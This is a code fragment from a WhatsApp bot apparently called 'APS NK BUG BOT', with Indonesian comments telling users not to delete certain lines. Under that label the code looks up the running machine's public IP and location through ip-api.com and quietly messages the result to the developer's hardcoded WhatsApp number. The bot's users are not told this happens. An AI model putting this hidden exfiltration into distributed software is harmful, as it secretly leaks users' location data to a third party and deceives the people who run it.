...
//ngak penting tapi jangan lu hapus
    const banner=cfonts["render"](("APS NK          BUG BOT"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
...
//  ngak penting tapi jangan lu hapus
    ...
    hyper.browserDescription = ["APS NK BUG BOT", "Safari", "3.0"];
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       hyper.sendMessage("94740647377@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer APS NK Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94740647377?text=welcome"}}})
